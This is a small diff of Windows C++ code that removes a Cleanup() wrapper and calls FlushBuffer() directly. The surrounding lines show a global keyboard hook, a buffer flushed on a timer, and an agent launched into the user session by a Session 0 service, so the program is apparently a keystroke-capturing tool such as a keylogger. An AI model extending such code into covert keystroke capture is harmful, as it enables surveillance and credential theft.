@@ -411,14 +411,6 @@ VOID CALLBACK TimerProc([[maybe_unused]] HWND hwnd,
     FlushBuffer();
 }
 
-// ============================================================================
-// CLEANUP ON EXIT
-// ============================================================================
-void Cleanup()
-{
-    FlushBuffer(); // Final flush before leaving
-}
-
 // The agent (launched as Session 1 by the service in Session 0)
 int main()
 {
@@ -463,6 +455,6 @@ int main()
         KillTimer(nullptr, timerId);
     }
     UnhookWindowsHookEx(hKeyboardHook);
-    Cleanup();
+    FlushBuffer();
     return 0;
 }
